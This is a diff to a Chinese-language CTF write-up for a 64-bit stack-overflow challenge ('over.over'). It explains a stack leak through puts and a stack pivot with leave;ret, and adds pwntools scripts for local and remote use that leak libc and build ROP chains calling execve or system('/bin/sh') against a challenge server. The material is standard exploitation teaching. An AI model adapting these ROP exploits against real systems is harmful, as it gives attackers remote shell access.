@@ -231,17 +231,16 @@ int sub_400676()
 }
 ```
 
-可以看出read读96字节但buf长度已经有80字节，所以只能覆盖saved rbp和retaddr
-
-这个题的思路是泄露libc执行execve
+这个题的思路是泄露libc执行execve，但可以看出read读96字节但buf长度已经有80字节，所以只能通过覆盖saved rbp和retaddr来劫持`RBP`
+我们向buf上写入rop链，然后劫持`RSP`和`RBP`到此处，这就需要我们知道buf的地址
 
 #### leak stack
 
-我们使用`puts`函数leak出save rbp，然后就能根据`RBP`的值推算出栈上各个数据的地址
+我们使用`puts`函数泄露出saved rbp，然后就能根据saved rbp的值推算出栈上各个数据的地址
 
-我们leak的时候靠的是运行`sub_400676()`这个函数中的puts函数，而传给puts的参数是位于`sub_400676`栈上的`buf`，`buf`挨着的是`sub_400676`的saved rbp，而这个saved rbp是主调函数的，也就是`main`函数。我们需要计算`main`函数的`RBP`地址到`buf`的长度，因为我们的目的是在`buf`上填入rop链，然后劫持`RBP`和`RSP`到`buf`上。
+我们leak的时候靠的是运行`sub_400676()`这个函数中的puts函数，而传给puts的参数是位于`sub_400676`栈上的`buf`，`buf`挨着的是`sub_400676`栈上的saved rbp，而这个saved rbp是主调函数的，也就是`main`函数的`RBP`。我们需要计算`main`函数的`RBP`地址到`buf`的长度，长度值加上`main`函数的`RBP`即得到`buf`的地址。
 
-一种简单的计算方法是调试，在main函数下断点看看RBP的值，然后运行到`sub_400676`看看`buf`的地址，直接一减就出来了。
+一种简单的计算方法是调试，在`main`函数下断点看看`RBP`的值，然后运行到`sub_400676`看看`buf`的地址，直接一减就出来了。
 
 另一种方法是看汇编，`main`函数中:
 
@@ -250,7 +249,7 @@ int sub_400676()
 .text:00000000004006C4                 sub     rsp, 10h
 ```
 
-这使`RBP`的值固定，`RSP`减0x10，也就是说`main`函数的栈大小为0x10，即`RSP`到`RBP`距离为0x10
+这使`RBP`的值固定，`RSP`减0x10，也就是说`main`函数中`RSP`到`RBP`距离为0x10
 
 随后运行到`call sub_400676()`：
 
@@ -262,11 +261,13 @@ int sub_400676()
 
 这使得`RSP`向下移动了0x8+0x8+0x50=0x60。其中第一个0x8是`call`指令把返回地址压栈造成的
 
-所以`RSP`到最初`RBP`的距离是0x10+0x60=0x70
+所以`RSP`到最初`main`函数`RBP`的距离是0x10+0x60=0x70
 
 当我们泄露出`main`函数的`RBP`，我们对其减0x70，就能得到`buf`的地址了
 
 #### exp：
+
+本地打：
 
 ```python
 from pwn import *
@@ -346,9 +347,6 @@ pop_rdx_rbx_ret = libc.address+0x90529
 # execve("/bin/sh", 0, 0)
 print("/bin/sh ",hex(next(libc.search(b"/bin/sh"))))
 print("execve", hex(libc.sym['execve']))
-
-# payload=flat([b'/bin/sh\0', pop_rdi_ret, p64(buf-0x30), pop_rsi_ret, p64(0), pop_rdx_rbx_ret, p64(0), p64(0xdeadbeef), libc.sym['execve'],(80 - 8*9)*b"a", buf - 0x30, 0x4006be])
-
 payload=flat([b'22222222', pop_rdi_ret, next(libc.search(b"/bin/sh")),pop_rsi_ret,p64(0),pop_rdx_rbx_ret,p64(0),p64(0xdeadbeef), libc.sym['execve'], (80 - 9*8 ) * b'2', buf - 0x30, 0x4006be])
 # 此payload和之前的类似，但不同之处是最后是buf - 0x30
 # 观察上一个payload，第一次pop rbp时rsp指向payload中的buf位置
@@ -362,6 +360,49 @@ payload=flat([b'22222222', pop_rdi_ret, next(libc.search(b"/bin/sh")),pop_rsi_re
 
 io.sendafter(b">", payload)
 
+io.interactive()
+```
+
+远程打：
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+context.binary = "./over.over"
+#io = process("./over.over")
+io = remote("114.51.41.9", 11451)
+elf = ELF("./over.over")
+
+io.sendafter(b">", b'a' * 80)
+buf = u64(io.recvuntil(b"\x7f")[-6: ].ljust(8, b'\0')) - 0x70
+
+success("buf -> {:#x}".format(buf))
+
+pop_rdi_ret=0x400793
+leave_ret = 0x4006be
+
+payload = flat([b'11111111', pop_rdi_ret, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * b'1', buf, leave_ret])
+
+io.sendafter(b">", payload)
+puts_addr = u64(io.recvuntil(b"\x7f")[-6: ].ljust(8, b'\0'))
+
+libc = LibcSearcher("puts", puts_addr)
+base = puts_addr - libc.dump("puts")
+#bin_sh = libc.dump("str_bin_sh") + base
+system = libc.dump("system") + base
+# 远程打用execve要三个参数，有时找gadgets得用libc，就得去下载相应的libc，所以能用system就用system
+
+'''
+❯ ROPgadget --binary over.over --only "ret"
+Gadgets information
+============================================================
+0x0000000000400509 : ret
+'''
+ret = 0x400509 # 栈对齐
+payload=flat([b'/bin/sh\0', pop_rdi_ret, p64(buf-0x30), ret, system, (80 - 8*5)*b"a", buf - 0x30, 0x4006be])
+# 把字符串存栈里调用也可以
+
+io.sendafter(b">", payload)
 io.interactive()
 ```
 
